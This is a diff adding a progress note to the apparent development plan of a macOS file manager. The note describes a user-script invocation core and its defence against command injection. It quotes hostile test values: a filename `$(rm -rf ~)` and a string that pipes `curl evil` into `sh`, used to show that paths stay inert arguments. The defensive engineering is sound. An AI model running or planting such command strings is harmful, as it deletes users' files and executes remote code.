@@ -1861,6 +1861,60 @@ row as `..`. **VERIFIED LIVE** in the built app driven end to end: `old-code` ro
 `/Users/oleg/jMeter`; the "Users" crumb → `/Users`; and a 2-mark selection → "Copy Paths" copying
 `…/old-code\n…/results`. 698 core+app tests green, swiftformat + swiftlint clean.
 
+Progress (2026-07-16, M6 pass 12 — the user-scripts automation core): the pure, tested half of the
+automation item's exit-criterion feature ("a user-defined 'convert to webp' script on selection runs
+from the palette"). Box stays `[ ]` — no store persistence, no process runner, no palette wiring, no
+management UI yet; this is the model + invocation-building half, the same core-first opener every
+M4/M5/M6 slice used. **Two new `DirnexCore/Services/` files, purely additive** (no existing-API
+changes, so the app is untouched and needs no rebuild). Probing ran ahead of the Swift (the pass-1
+method): the `sh -c 'body' name arg1 arg2` argv mapping (`$0`=name, `$1`=arg1, `$#`=count, spaces in
+a path preserved as one element) and env/`cwd` passthrough were captured live before the model was
+shaped, which fixed the whole security stance in place.
+- **`UserScript.swift`** — `UserScript` (name-as-identity `command`+`runMode`+`keywords`, `Codable`,
+  secret-free) plus its invocation machinery. `UserScriptRunMode` = `.combined` (one run, whole
+  selection as `"$@"`) vs `.perFile` (one run per file, `$1` = that file — the webp case). A
+  `UserScriptContext` (selection + both panel dirs) turns into `[UserScriptInvocation]` via
+  `invocations(in:shell:)`: **`.combined` yields one invocation even for an empty selection** (a
+  directory-scoped script still runs, via env), **`.perFile` yields zero** (nothing to act on).
+  **THE SECURITY BOUNDARY, and the reason this is a tested core type, not app glue:** the script text
+  is user-authored (trusted), but the *selected paths are attacker-controlled data* — unzip a
+  download and you can be browsing a file named ``$(rm -rf ~)`` — so every path is handed to the
+  shell as a **separate `argv` element** (`["-c", command, name] + files`) and as environment values,
+  **never concatenated into the command text**. A hostile filename therefore arrives as one inert
+  `"$1"` and cannot break out and execute — the same "a filename is attacker-controlled data" stance
+  `ShellCommandLine` takes for the terminal drawer, pinned by a test that feeds
+  ``/tmp/$(rm -rf ~); `curl evil | sh` && echo pwned.txt`` through and asserts it lands verbatim as a
+  single argument with the body unchanged. Passing `name` as `$0` also makes the shell's own
+  diagnostics read `<name>: …`. The `UserScriptEnvironment` contract (named constants, not magic
+  strings) exports `DIRNEX_CURRENT_DIR` (= the process `cwd`), `DIRNEX_OTHER_DIR` (omitted when
+  single-pane), `DIRNEX_SELECTION_COUNT`, and `DIRNEX_SELECTED_PATHS` (newline-joined — a documented
+  convenience, since `"$@"` is the ambiguity-free authority for a filename that itself holds a
+  newline). A palette bridge (`commandID` = `userScript.<name>`, its inverse `name(fromCommandID:)`,
+  and `paletteCommand`) lets a script rank/render in ⌘K alongside the built-ins, keyed on the
+  `userScript.` prefix so the app can route a pick to the runner instead of an AppKit selector.
+- **`UserScripts.swift`** — the ordered, name-de-duplicated collection (a near-twin of
+  `ServerConnections`: `save` overwrite-in-place-else-append, `remove`/`rename`/`move`, dedup on
+  init *and* on `Codable` decode so a hand-edited store is sanitized), plus `paletteCommands` for the
+  app to merge into the catalog.
++22 tests → **724 core tests** (two new suites: invocation shape incl. the empty-selection split, the
+two security cases, the env contract, the command-id round-trip, and the collection's save/rename/
+move/dedup/JSON rules). `swift test` green, swiftformat + swiftlint-strict clean; app target
+untouched. **NEXT (M6 pass 13, the app layer that closes the box):** `UserScriptStore` (UserDefaults
+JSON + change-notification, like `ServerConnectionStore`), a `UserScriptRunner` (`Process` per
+invocation off-main, sequential, collecting exit codes + stderr, surfacing a failure summary and
+leaning on the pane's existing FSEvents watch to show new files — the `ExternalDiffLauncher` shape),
+palette dispatch (merge `UserScriptStore.load().paletteCommands` into `reload`, and route a
+`userScript.*` pick in `runSelected` to `PanelViewController.runUserScript(_:)` via a
+`representedObject`-carrying sender), a `PanelViewController+UserScript.swift` that builds the context
+from `handoffTargets`/the two panes' dirs and resolves the shell, a right-click **Scripts ▸** submenu
+(dynamic, like the tags/servers submenus), and a management surface to *create* scripts (a Settings
+tab or an organizer sheet in the `HotlistOrganizerController` idiom) — then VERIFY LIVE that a
+user-defined script on a selection runs from the palette. After that: the **F-key bar** surface (a
+TC-style function-key button row, which does not exist in the app yet), and the **AppleScript/
+Shortcuts verbs** (reveal, copy, run-op — an AppKit scripting `sdef` / App Intents surface, the
+separate automation mechanism the item also names), then the iCloud sync-status column, which closes
+M6.
+
 ### M7 — Release readiness (M)
 
 - [ ] Sparkle 2 updates + appcast infrastructure; notarized DMG pipeline in CI
